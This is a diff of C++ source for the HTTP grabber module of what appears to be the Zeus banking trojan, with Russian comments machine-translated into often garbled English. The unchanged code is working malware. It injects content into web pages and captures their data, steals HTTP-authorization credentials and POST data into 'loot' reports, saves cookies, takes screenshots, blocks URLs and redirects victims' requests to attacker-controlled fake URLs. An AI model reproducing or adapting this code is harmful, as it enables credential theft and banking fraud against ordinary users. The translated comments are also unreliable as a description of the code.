@@ -19,15 +19,15 @@
 #include "..\common\debug.h"
 #include "..\common\registry.h"
 
-//Хэш последней HTTP-авторизации (ламерский способ для предотврашения дублирования отчетов).
+//Hash of the last HTTP-authorization (lamersky way to predotvrasheniya duplicate reports).
 static DWORD lastHttpAuthorizationHash;
 
-//Данные о блокируемой URL.
+//Data on lockable URL.
 static struct
 {
-  CRITICAL_SECTION cs;   //Крит. секция для доступа к переменным.
-  LPSTR urlMaskForBlock; //Маска URL, по которой будет заблокирован доступ (== HttpInject::HEADER.urlMask).
-  LPSTR blockOnUrl;      //Маска URL, из-за которой будет заблокирован инжект (== HttpInject::HEADER.blockOnUrl). 
+  CRITICAL_SECTION cs;   //Crit. Section for accessing variables.
+  LPSTR urlMaskForBlock; //Mask URL, to which access is blocked (== HttpInject:: HEADER.urlMask).
+  LPSTR blockOnUrl;      //Mask URL, because of which will be blocked inject (== HttpInject:: HEADER.blockOnUrl).
 }blockInjectInfo;
 
 void HttpGrabber::init(void)
@@ -53,7 +53,7 @@ LPSTR HttpGrabber::_genarateMirrorFakeUrlA(const LPSTR fakeUrl, const LPSTR orig
   
   if(urlMaskSize > 0 && originalUrlSize > 0 && fakeUrlSize > 0)
   {
-    //Ишим конец дейтсвия маски без учета последнего компанента пути URL.
+    //Ishim end to applicable mask excluding the last kompanenta path URL.
     LPSTR start = urlMask + urlMaskSize;
     while(start > urlMask && *start != '/')start--;
     if(start > urlMask)
@@ -161,15 +161,15 @@ bool HttpGrabber::_addUrlMaskToList(DWORD listId, BinStorage::STORAGE **localCon
   DWORD itemListSize;
   LPSTR itemList = (LPSTR)BinStorage::_getItemDataEx(*localConfig, listId, BinStorage::ITEMF_IS_SETTING, &itemListSize);
 
-  //Если элемент существует, ищим клон.
+  //If the element exists ischim clone.
   if(Str::_isValidMultiStringA(itemList, itemListSize))
   {
-    //Ищим элемент в списке.
+    //Ischim item in the list.
     LPSTR curItem = itemList;
     int urlMaskLen = Str::_LengthA(urlMask);
     while(Str::_CompareA(urlMask, curItem, urlMaskLen, -1) != 0 && (curItem = Str::_multiStringGetIndexA(curItem, 1)) != NULL);
 
-    //Клон не найден.
+    //Clone was not found.
     if(curItem != NULL)
     {
 #     if defined WDEBUG0
@@ -184,7 +184,7 @@ bool HttpGrabber::_addUrlMaskToList(DWORD listId, BinStorage::STORAGE **localCon
       ok = BinStorage::_modifyItemById(localConfig, listId, BinStorage::ITEMF_IS_SETTING | BinStorage::ITEMF_COMBINE_OVERWRITE, itemList, itemListSize);
     }
   }
-  //Если элемент поврежден или отсутвует, подменяем на новый.
+  //If the item is damaged or otsutvuet, substitutes a new one.
   else
   {
     LPSTR newItem;
@@ -208,14 +208,14 @@ bool HttpGrabber::_removeUrlMaskFromList(DWORD listId, BinStorage::STORAGE **loc
   DWORD itemListSize;
   LPSTR itemList = (LPSTR)BinStorage::_getItemDataEx(*localConfig, listId, BinStorage::ITEMF_IS_SETTING, &itemListSize);
 
-  //Проверяем правильность списка.
+  //Check the correctness of the list.
   if(Str::_isValidMultiStringA(itemList, itemListSize))
   {
-    //Создаем копию списка для копирования в него, элементов не попавших под маску.
+    //Create a copy of the list to be copied into it, the elements do not fall under the mask.
     LPSTR newItemList = (LPSTR)Mem::alloc(itemListSize);
     if(newItemList != NULL)  
     {
-      //Ишим элементы.
+      //Ishim elements.
       LPSTR curItem = itemList;
       LPSTR offset  = newItemList;
       int len;
@@ -231,14 +231,14 @@ bool HttpGrabber::_removeUrlMaskFromList(DWORD listId, BinStorage::STORAGE **loc
         {
           Str::_CopyA(offset, curItem, len);
           offset += len + 1;
-          *offset = 0; //Завершающий байт мульти-строки.
+          *offset = 0; //The final multi-byte string.
         }
       }
       while((curItem = Str::_multiStringGetIndexA(curItem, 1)) != NULL);
 
       if(ok == true)
       {
-        if(offset == newItemList)offset--; //Почти аналог BinStorage::ITEMF_COMBINE_DELETE.
+        if(offset == newItemList)offset--; //Almost analog BinStorage:: ITEMF_COMBINE_DELETE.
         ok = BinStorage::_modifyItemById(localConfig, listId, BinStorage::ITEMF_IS_SETTING | BinStorage::ITEMF_COMBINE_OVERWRITE, newItemList, offset - newItemList + 1);
       }
       Mem::free(newItemList);
@@ -295,13 +295,13 @@ static bool checkRequestForInject(HttpGrabber::REQUESTDATA *requestData)
 
     while(HttpInject::_isCorrectHeader(curInject))
     {
-      LPSTR p          = (LPSTR)curInject; //Переменная для легокого доступа к строкам.
+      LPSTR p          = (LPSTR)curInject; //Variable for easy access to the rows.
       LPSTR urlMask    = p + curInject->urlMask;
       DWORD matchFlags = curInject->flags &  HttpInject::FLAG_URL_CASE_INSENSITIVE ? Str::MATCH_CASE_INSENSITIVE_FAST : 0;
       
       if((curInject->flags & knownFlags) == knownFlags && HttpGrabber::_matchUrlA(urlMask, requestData->url, requestData->urlSize, matchFlags))
       {
-        //Проверяем по блеклисту.
+        //Check on the blacklist.
         if(requestData->localConfig != NULL && HttpGrabber::_isUrlInList(LocalConfig::ITEM_URLLIST_BLOCKEDINJECTS, requestData->localConfig, requestData->url, requestData->urlSize, matchFlags))
         {
 #         if defined WDEBUG1
@@ -310,7 +310,7 @@ static bool checkRequestForInject(HttpGrabber::REQUESTDATA *requestData)
           goto SKIP_ITEM;
         }
 
-        //Проверяем пост-данные.
+        //Check the post-data.
         if(curInject->postDataBlackMask > 0 && HttpGrabber::_matchPostDataA(p + curInject->postDataBlackMask, (LPSTR)requestData->postData, requestData->postDataSize) == true)
         {
           goto SKIP_ITEM;
@@ -320,7 +320,7 @@ static bool checkRequestForInject(HttpGrabber::REQUESTDATA *requestData)
           goto SKIP_ITEM;
         }
 
-        //Проверяем суточные ограничения.
+        //Check the daily limit.
         if(curInject->flags & HttpInject::FLAG_ONCE_PER_DAY && curInject->blockOnUrl > 0)
         {
           SYSTEMTIME lastTime;
@@ -330,7 +330,7 @@ static bool checkRequestForInject(HttpGrabber::REQUESTDATA *requestData)
 
           Core::getRegistryValue(Core::RV_LOCALCONFIG, key, value);
 
-          //Получаем хэш.
+          //Obtain the hash.
           {
             LPSTR blockUrl = p + curInject->blockOnUrl;
             BYTE hash[MD5HASH_SIZE];
@@ -338,7 +338,7 @@ static bool checkRequestForInject(HttpGrabber::REQUESTDATA *requestData)
             Str::_toHexW(hash, MD5HASH_SIZE, value);
           }
           
-          //Проверяем значение.
+          //Check the value.
           if(Registry::_getValueAsBinary(HKEY_CURRENT_USER, key, value, NULL, &lastTime, sizeof(SYSTEMTIME)) == sizeof(SYSTEMTIME))
           {
             SYSTEMTIME curTime;
@@ -353,7 +353,7 @@ static bool checkRequestForInject(HttpGrabber::REQUESTDATA *requestData)
           }
         }
 
-        //Все хорошо, собираем данные.
+        //All is well, collect the data.
         {
           HttpGrabber::INJECTFULLDATA ifd;
 #         if defined WDEBUG2
@@ -367,10 +367,10 @@ static bool checkRequestForInject(HttpGrabber::REQUESTDATA *requestData)
           ifd.blockOnUrl  = curInject->blockOnUrl == 0  ? NULL : Str::_CopyExA(p + curInject->blockOnUrl,  -1);
           ifd.contextMask = curInject->contextMask == 0 ? NULL : Str::_CopyExA(p + curInject->contextMask, -1);
          
-          //Фейк.
+          //Fake.
           if(curInject->flags & (HttpInject::FLAG_IS_FAKE | HttpInject::FLAG_IS_MIRRORFAKE))
           {
-            //Мульти фейки нельзя использовать, удаляем все инжекты.
+            //Multi fakie impossible to use, remove all injected.
             _freeInjectFullDataList(requestData->injects, requestData->injectsCount);
             requestData->injectsCount = 0;
 
@@ -379,7 +379,7 @@ static bool checkRequestForInject(HttpGrabber::REQUESTDATA *requestData)
 
             break;
           }
-          //Инжект.
+          //Inject.
           else if(curInject->flags & (HttpInject::FLAG_IS_INJECT | HttpInject::FLAG_IS_CAPTURE))
           {
             if((ifd.injects = (HttpInject::INJECTBLOCK *)BinStorage::_getItemDataEx(requestData->dynamicConfig, 1 + index, BinStorage::ITEMF_IS_HTTP_INJECT, &ifd.injectsSize)) != NULL &&
@@ -402,7 +402,7 @@ static bool checkRequestForInject(HttpGrabber::REQUESTDATA *requestData)
               break;
             }
           }
-          //Неизвестно.
+          //Unknown.
           else 
           {
             HttpGrabber::_freeInjectFullData(&ifd);
@@ -415,7 +415,7 @@ static bool checkRequestForInject(HttpGrabber::REQUESTDATA *requestData)
 SKIP_ITEM:;
       }
 
-      //Вычисляем следующий элемент.
+      //Compute the next element.
       curInject = (HttpInject::HEADER *)(((LPBYTE)curInject) + curInject->size);
       if(((LPBYTE)curInject) + sizeof(HttpInject::HEADER) > endOfList || ((LPBYTE)curInject) + curInject->size > endOfList)break;
       index++;
@@ -455,14 +455,14 @@ static bool replacePostData(HttpGrabber::REQUESTDATA *requestData)
       LPSTR *varables;
       DWORD varablesCount;
 
-      //Получем список переменных.
+      //Obtain a list of variables.
       if((varablesCount = Str::_splitToStringsA((LPSTR)requestData->postData, requestData->postDataSize, &varables, Str::STS_USE_SEPARATOR, '&')) != (DWORD)-1)
       {
         LPSTR *badVarables;
         DWORD badVarablesCount;
         curMask = Str::_multiStringGetIndexA(curMask, 1);
 
-        //Получаем список "плохих" переменных.
+        //Get a list of "bad" variables.
         if(curMask != NULL && (badVarablesCount = Str::_splitToStringsA(curMask, Str::_LengthA(curMask), &badVarables, Str::STS_USE_SEPARATOR, ';')) != (DWORD)-1)
         {
           LPSTR newPostData     = (LPSTR)Mem::alloc(requestData->postDataSize);
@@ -470,13 +470,13 @@ static bool replacePostData(HttpGrabber::REQUESTDATA *requestData)
 
           if(newPostData != NULL)
           {
-            //Ищим.
+            //Ischim.
             for(DWORD i = 0; i < varablesCount; i++)if(varables[i] != NULL && varables[i][0] != 0)
             {
               bool skip = false;
               int len   = 0;
 
-              //Длина переменной.
+              //The length of the variable.
               while(varables[i][len] != '=' && varables[i][len] != 0)len++;
 
               for(DWORD j = 0; j < badVarablesCount; j++)if(badVarables[j] != NULL && badVarables[j][0] != 0 && HttpGrabber::_matchPostDataA(badVarables[j], varables[i], len))
@@ -485,7 +485,7 @@ static bool replacePostData(HttpGrabber::REQUESTDATA *requestData)
                 break;
               }
 
-              //Копируем переменную.
+              //Copy the variable.
               if(skip == false)
               {
                 if(newPostDataSize != 0)newPostData[newPostDataSize++] = '&';
@@ -496,12 +496,12 @@ static bool replacePostData(HttpGrabber::REQUESTDATA *requestData)
               }
             }
 
-            //Не чего не изменилось.
+            //Not what has not changed.
             if(newPostDataSize == requestData->postDataSize)
             {
               Mem::free(newPostData);
             }
-            //Изменения есть.
+            //Change is.
             else
             {
               if(newPostDataSize == 0)
@@ -545,7 +545,7 @@ DWORD HttpGrabber::analizeRequestData(REQUESTDATA *requestData)
   DWORD retVal = 0;
   signed char writeReport = -1;/*-1 - по умолчанию, 0 - не писать, 1 - принудительно писать*/;
 
-  //Проверяем на блокировку.
+  //Check for blockage.
   CWA(kernel32, EnterCriticalSection)(&blockInjectInfo.cs);
   if(blockInjectInfo.blockOnUrl != NULL && blockInjectInfo.urlMaskForBlock != NULL && _matchUrlA(blockInjectInfo.blockOnUrl, requestData->url, requestData->urlSize, 0))
   {
@@ -553,7 +553,7 @@ DWORD HttpGrabber::analizeRequestData(REQUESTDATA *requestData)
     WDEBUG1(WDDT_INFO, "Detected blocking url [%S] for current url.", blockInjectInfo.blockOnUrl);
 #   endif    
 
-    //Нельзя юзать requestData->localConfig т.к. она открта только для чтения.
+    //You can not juzat requestData-> localConfig because She otkrta read-only.
     BinStorage::STORAGE *localConfig = LocalConfig::beginReadWrite();
     if(localConfig != NULL)
     {
@@ -575,7 +575,7 @@ DWORD HttpGrabber::analizeRequestData(REQUESTDATA *requestData)
   }
   CWA(kernel32, LeaveCriticalSection)(&blockInjectInfo.cs);
   
-  //Проверяем запрос по фильтру.
+  //Check request to the filter.
   if(requestData->dynamicConfig != NULL)
   {
     DWORD httpFilterSize;
@@ -586,19 +586,19 @@ DWORD HttpGrabber::analizeRequestData(REQUESTDATA *requestData)
       LPSTR curFilter = httpFilter;
       do if(curFilter[1] != 0)
       { 
-        //Опеределяем тип фильтра.
+        //Operedelyaem type of filter.
         char filterType;
         switch(curFilter[0])
         {
-          case '!': filterType = 1; break; //Не писать в отчет,
-          case '@': filterType = 2; break; //Скриншот.
-          case '-': filterType = 3; break; //Сохранение всех куков связаных с URL, и блокировка доступа.
-          case '^': filterType = 4; break; //Блокировка доступа.
-          default:  filterType = 0; break; //Принудительно писать в отчет.
+          case '!': filterType = 1; break; //Do not write a report,
+          case '@': filterType = 2; break; //Screenshot.
+          case '-': filterType = 3; break; //Save all the cookies associated to the URL, and blocking access.
+          case '^': filterType = 4; break; //Blocking access.
+          default:  filterType = 0; break; //Forced to write a report.
         }
         if(filterType != 0)curFilter++;
 
-        //Сравниваем URL.
+        //Compare the URL.
         if(_matchUrlA(curFilter, requestData->url, requestData->urlSize, 0))
         {
 #         if defined WDEBUG3
@@ -638,8 +638,8 @@ DWORD HttpGrabber::analizeRequestData(REQUESTDATA *requestData)
 
             case 3:
             {
-              //FIXME: saveSessionCookies(requestData->url);
-              //НЕ НАДА ТУТ break!
+              //FIXME: saveSessionCookies (requestData-> url);
+              //NOT NADA HERE break!
             }
             
             case 4:
@@ -650,7 +650,7 @@ DWORD HttpGrabber::analizeRequestData(REQUESTDATA *requestData)
             }
           }
 
-          if(filterType != 2)break; //В случаи с скриншотом, продолжаем поиск.
+          if(filterType != 2)break; //In the case of a screenshot, the search continues.
         }
       }
       while((curFilter = Str::_multiStringGetIndexA(curFilter, 1)));      
@@ -659,7 +659,7 @@ DWORD HttpGrabber::analizeRequestData(REQUESTDATA *requestData)
     Mem::free(httpFilter);
   }
 
-  //Если URL, пока не является заблакируемой. Пытаемся ее заблокировать.
+  //If the URL, it is not yet zablakiruemoy. Trying to block it.
   if((retVal & HttpGrabber::ANALIZEFLAG_URL_BLOCKED) == 0 && requestData->localConfig != NULL)
   {
     if(_isUrlInList(LocalConfig::ITEM_URLLIST_BLOCKED, requestData->localConfig, requestData->url, requestData->urlSize, 0))
@@ -669,7 +669,7 @@ DWORD HttpGrabber::analizeRequestData(REQUESTDATA *requestData)
     }
   }
 
-  //Проверяем тип содержимого.
+  //Check the content type.
   if(requestData->contentTypeSize >= (CryptedStrings::len_httpgrabber_urlencoded - 1))
   {
     CSTR_GETA(formUrlEncoded, httpgrabber_urlencoded);
@@ -679,7 +679,7 @@ DWORD HttpGrabber::analizeRequestData(REQUESTDATA *requestData)
        )retVal |= HttpGrabber::ANALIZEFLAG_POSTDATA_URLENCODED;
   }
 
-  //Проверяем наличие HTTP-авторизации.
+  //Check the availability of HTTP-authorization.
   LPWSTR authorizationData  = NULL;
   int authorizationDataSize = 0;
   if(requestData->authorizationData.userName != NULL && *requestData->authorizationData.userName != 0 && requestData->authorizationData.password != NULL && *requestData->authorizationData.password != 0)
@@ -693,7 +693,7 @@ DWORD HttpGrabber::analizeRequestData(REQUESTDATA *requestData)
     authorizationDataSize = Str::_sprintfExW(&authorizationData, format, requestData->authorizationData.unknownType);
   }
 
-  //Проверяем хэш  HTTP-авторизации.
+  //Check the hash HTTP-authorization.
   if(authorizationDataSize > 0)
   {
     DWORD hash = Crypt::crc32Hash(authorizationData, authorizationDataSize * sizeof(WCHAR));
@@ -709,7 +709,7 @@ DWORD HttpGrabber::analizeRequestData(REQUESTDATA *requestData)
     }
   }
 
-  //Опеределям нужно ли писать отчет.  
+  //Operedelyam whether to write the report.
   {    
     if(writeReport == -1)
     {
@@ -718,13 +718,13 @@ DWORD HttpGrabber::analizeRequestData(REQUESTDATA *requestData)
     else if(writeReport == 1)retVal |= ANALIZEFLAG_SAVED_REPORT;
   }
   
-  //Пишим отчет
+  //Pishim report
   if(retVal & ANALIZEFLAG_SAVED_REPORT)
   {
     LPSTR postData = NULL;
     bool ok = false;
     
-    //Форматируем POST-запрос.
+    //Format the POST-request.
     if(requestData->postDataSize == 0)
     {
       CSTR_GETA(decodedString, httpgrabber_report_empty);
@@ -747,7 +747,7 @@ DWORD HttpGrabber::analizeRequestData(REQUESTDATA *requestData)
       postData = Str::_CopyExA(decodedString, CryptedStrings::len_httpgrabber_report_unknown - 1);
     }
   
-    //Формируем отчет.
+    //Form the report.
     if(postData != NULL)
     {
       LPWSTR userInput;
@@ -764,7 +764,7 @@ DWORD HttpGrabber::analizeRequestData(REQUESTDATA *requestData)
 
         if(CWA(wininet, InternetCrackUrlA)(requestData->url, requestData->urlSize, 0, &uc) == TRUE)
         {
-          //Пишим.
+          //Pishim.
           CSTR_GETW(reportFormat, httpgrabber_report_format);
           CSTR_GETW(reportBlocked, httpgrabber_report_blocked);
           
@@ -791,7 +791,7 @@ DWORD HttpGrabber::analizeRequestData(REQUESTDATA *requestData)
   
   Mem::free(authorizationData);
     
-  //Если URL оказалась заблокирована, применять следущие флаги нет смысла.
+  //If the URL was blocked, the following items to use the flags does not make sense.
   if(retVal & ANALIZEFLAG_URL_BLOCKED)
   {
 #   if defined WDEBUG0
@@ -801,7 +801,7 @@ DWORD HttpGrabber::analizeRequestData(REQUESTDATA *requestData)
     goto END;
   }
 
-  //Проверка на инжекты и фейки.
+  //Check for the injected and fakie.
   if(checkRequestForInject(requestData))
   {
     retVal |= ANALIZEFLAG_URL_INJECT;
@@ -810,7 +810,7 @@ DWORD HttpGrabber::analizeRequestData(REQUESTDATA *requestData)
 #   endif
   }
 
-  //Проверка на замену POST-данных.
+  //Check for replacement POST-data.
   if(retVal & HttpGrabber::ANALIZEFLAG_POSTDATA_URLENCODED && replacePostData(requestData))
   {
     retVal |= ANALIZEFLAG_POSTDATA_REPLACED;
@@ -825,14 +825,14 @@ END:
 
 bool HttpGrabber::_executeInjects(const LPSTR url, LPBYTE *context, LPDWORD contextSize, const INJECTFULLDATA *dataList, DWORD count)
 {
-  DWORD changesCount = 0; //Кол. примененых инжектов.
+  DWORD changesCount = 0; //Count. Applied injected.
 
   for(DWORD i = 0; i < count; i++)
   {
     INJECTFULLDATA *curData = (INJECTFULLDATA *)&dataList[i];
     DWORD matchFlags = curData->flags & HttpInject::FLAG_CONTEXT_CASE_INSENSITIVE ? Str::MATCH_CASE_INSENSITIVE_FAST : 0;
 
-    //Проверка маски контента.
+    //Check the mask content.
     if(curData->contextMask != NULL && !_matchContextA(curData->contextMask, *context, *contextSize, matchFlags))
     {
 #     if defined WDEBUG0
@@ -846,19 +846,19 @@ bool HttpGrabber::_executeInjects(const LPSTR url, LPBYTE *context, LPDWORD cont
     LPBYTE curBlock        = (LPBYTE)curData->injects;
     LPBYTE endBlock        = curBlock + curData->injectsSize;
 
-    //Применяем инжекты, грабим данные.
+    //Apply injected, rob data.
     while(curBlock < endBlock)
     {
-      //Ищим место замены.
-      DWORD offsetBegin; //Начало данных для замены.
-      DWORD offsetEnd;   //Конец данных для замены.
+      //Ischim seat replacement.
+      DWORD offsetBegin; //The following data for replacement.
+      DWORD offsetEnd;   //End of data for replacement.
       HttpInject::INJECTBLOCK *blockPrefix = (HttpInject::INJECTBLOCK *)curBlock;
       HttpInject::INJECTBLOCK *blockPostfix  = (HttpInject::INJECTBLOCK *)((LPBYTE)blockPrefix + blockPrefix->size);
       HttpInject::INJECTBLOCK *blockNew    = (HttpInject::INJECTBLOCK *)((LPBYTE)blockPostfix + blockPostfix->size);
       
-      curBlock = (LPBYTE)blockNew + blockNew->size; //Следующий элемент.
+      curBlock = (LPBYTE)blockNew + blockNew->size; //The next element.
       
-      //Получаем позицию начала.
+      //Obtain the start position.
       if(blockPrefix->size == sizeof(HttpInject::INJECTBLOCK))
       {
         offsetBegin = 0;
@@ -868,7 +868,7 @@ bool HttpGrabber::_executeInjects(const LPSTR url, LPBYTE *context, LPDWORD cont
         continue;
       }
       
-      //Получаем позицию конца.
+      //Obtain the position of the end.
       if(blockPostfix->size == sizeof(HttpInject::INJECTBLOCK))
       {
         if(blockPrefix->size == sizeof(HttpInject::INJECTBLOCK))offsetEnd = *contextSize;
@@ -884,16 +884,16 @@ bool HttpGrabber::_executeInjects(const LPSTR url, LPBYTE *context, LPDWORD cont
         continue;
       }      
       
-      DWORD blockNewDataSize = blockNew->size - sizeof(HttpInject::INJECTBLOCK); //Размер ставляемых данных.
-      DWORD matchedDataSize  = offsetEnd - offsetBegin;                          //Размер наденых данных.
+      DWORD blockNewDataSize = blockNew->size - sizeof(HttpInject::INJECTBLOCK); //The size of projects submitted data.
+      DWORD matchedDataSize  = offsetEnd - offsetBegin;                          //I wear size data.
 
-      //Замена.
+      //Replacement.
       if(curData->flags & HttpInject::FLAG_IS_INJECT)
       {
         DWORD newSize = *contextSize - matchedDataSize + blockNewDataSize;
         LPBYTE newBuf  = (LPBYTE)Mem::alloc(newSize);
 
-        if(newBuf != NULL) //Не обращаем внимание на ошибку.
+        if(newBuf != NULL) //Do not pay attention to the error.
         {
           Mem::_copy(newBuf,                                  *context,                                           offsetBegin);
           Mem::_copy(newBuf + offsetBegin,                    (LPBYTE)blockNew + sizeof(HttpInject::INJECTBLOCK), blockNewDataSize);
@@ -906,10 +906,10 @@ bool HttpGrabber::_executeInjects(const LPSTR url, LPBYTE *context, LPDWORD cont
           changesCount++;
         }
       }
-      //Сохранение.
+      //Conservation.
       else if(curData->flags & HttpInject::FLAG_IS_CAPTURE)
       {
-        if(Mem::reallocEx(&grabbedData, grabbedDataSize + blockNewDataSize + matchedDataSize + 1/*\n*/ + 1/*\0*/)) //Не обращаем внимание на ошибку.
+        if(Mem::reallocEx(&grabbedData, grabbedDataSize + blockNewDataSize + matchedDataSize + 1/*\n*/ + 1/*\0*/)) //Do not pay attention to the error.
         {
           if(blockNewDataSize > 0)
           {
@@ -927,7 +927,7 @@ bool HttpGrabber::_executeInjects(const LPSTR url, LPBYTE *context, LPDWORD cont
       }
     }
 
-    //Пишим награбленное.
+    //Pishim loot.
     if(curData->flags & HttpInject::FLAG_IS_CAPTURE)
     {
       /*if(grabbedData == NULL)
@@ -975,26 +975,26 @@ bool HttpGrabber::_executeInjects(const LPSTR url, LPBYTE *context, LPDWORD cont
 
     if(curData->blockOnUrl != NULL)
     {
-      //Суточное ограничение.
+      //The daily limit.
       if(curData->flags & HttpInject::FLAG_ONCE_PER_DAY)
       {
         WCHAR key[CORE_REGISTRY_KEY_BUFFER_SIZE];
         WCHAR value[max(CORE_REGISTRY_VALUE_BUFFER_SIZE, (MD5HASH_SIZE * 2 + 1))];
         Core::getRegistryValue(Core::RV_LOCALCONFIG, key, value);
 
-        //Получаем хэш.
+        //Obtain the hash.
         BYTE hash[MD5HASH_SIZE];
         if(Crypt::_md5Hash(hash, curData->blockOnUrl, Str::_LengthA(curData->blockOnUrl)))
         {
           Str::_toHexW(hash, MD5HASH_SIZE, value);
 
-          //Ставим значение.
+          //Put value.
           SYSTEMTIME curTime;
           CWA(kernel32, GetLocalTime)(&curTime);
           Registry::_setValueAsBinary(HKEY_CURRENT_USER, key, value, REG_BINARY, &curTime, sizeof(SYSTEMTIME));
         }
       }
-      //Обычная блокировка.
+      //Normal lock.
       else
       {
 #       if defined WDEBUG1
@@ -1046,7 +1046,7 @@ void HttpGrabber::_freeInjectFullDataList(INJECTFULLDATA *dataList, DWORD count)
   Mem::free(dataList);
 }
 
-//Данные для фейка.
+//Data for Faika.
 typedef struct
 {
   HttpGrabber::REQUESTDATA *requestData;
@@ -1054,25 +1054,23 @@ typedef struct
   HINTERNET fakeRequest;
 }FAKECONNECT;
 
-/*
-  Создание запроса к фейк-URL.
+/*В В Create a query to the fake-URL.
 
-  IN requestData - данные запроса.
-  IN faketUrl    - фейк-URL.
-  IN verb        - GET/POST.
+В В IN requestData - request data.
+В В IN faketUrl - fake-URL.
+В В IN verb - GET / POST.
 
-  Return         - хэндл запроса, NULL - в случаи ошибки.
-*/
+В В Return - the handle to the query, NULL - otherwise.*/
 static DWORD WINAPI fakeConnectProc(void *p)
 {
   CoreHook::disableFileHookerForCurrentThread(true);
   FAKECONNECT *fc = (FAKECONNECT *)p;
   
-  //Парсим URL.
+  //Parses the URL.
   HttpTools::URLDATA urlData;
   if(HttpTools::_parseUrl(fc->fakeUrl, &urlData))
   {
-    //Соединяемся.
+    //Connecting.
     HINTERNET fakeInternet = CWA(wininet, InternetOpenA)(coreData.httpUserAgent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
     if(fakeInternet != NULL)
     {
@@ -1100,7 +1098,7 @@ static DWORD WINAPI fakeConnectProc(void *p)
 
         if(fakeRequest != NULL)
         {
-          //Добавляем заголовоки.
+          //Adds a header.
           {
             LPSTR header;
 
@@ -1130,7 +1128,7 @@ static DWORD WINAPI fakeConnectProc(void *p)
             }
           }
 
-          //Отправляем запрос.
+          //Send request.
           if(CWA(wininet, HttpSendRequestA)(fakeRequest, NULL, 0, fc->requestData->postData, fc->requestData->postDataSize) == TRUE)
           {
             DWORD size   = sizeof(DWORD);
@@ -1141,7 +1139,7 @@ static DWORD WINAPI fakeConnectProc(void *p)
               LPSTR newUrl = (LPSTR)Wininet::_queryOptionExA(fakeRequest, INTERNET_OPTION_URL, &size);
               if(newUrl != NULL)
               {
-                //FIXME: TryUseURLMask(newUrl, size);
+                //FIXME: TryUseURLMask (newUrl, size);
                 Mem::free(newUrl);
               }
 
@@ -1163,7 +1161,7 @@ static DWORD WINAPI fakeConnectProc(void *p)
 
 HINTERNET HttpGrabber::_createFakeResponse(REQUESTDATA *requestData, INJECTFULLDATA *fakeData)
 {
-  //Генерируем URL фейка.
+  //Generate URL Faika.
   FAKECONNECT fakeConnect;
   fakeConnect.requestData = requestData;
   fakeConnect.fakeRequest = NULL;
@@ -1175,10 +1173,10 @@ HINTERNET HttpGrabber::_createFakeResponse(REQUESTDATA *requestData, INJECTFULLD
   WDEBUG1(WDDT_INFO, "fakeConnect.fakeUrl=[%S].", fakeConnect.fakeUrl);
 # endif
   
-  //Вызываем поток для прозрачного подключения.
+  //Call flow for a transparent connection.
   if(fakeConnect.fakeUrl != NULL)
   {
-    Core::initHttpUserAgent(); //Нужно вызвать здесь, т.к. вызов в другом потоке приведет к deadlock.
+    Core::initHttpUserAgent(); //You need to call here, because call on another thread will result in deadlock.
 
 #   if defined WDEBUG0
     WDEBUG0(WDDT_INFO, "Sending request to fake.");
@@ -1198,7 +1196,7 @@ HINTERNET HttpGrabber::_createFakeResponse(REQUESTDATA *requestData, INJECTFULLD
     Mem::free(fakeConnect.fakeUrl);
   }
   
-  //Проверяем результат.
+  //Check the results.
 # if(BO_DEBUG > 0 && defined WDEBUG)
   if(fakeConnect.fakeRequest == NULL)WDEBUG0(WDDT_ERROR, "Failed to create fake request.");
 # endif  
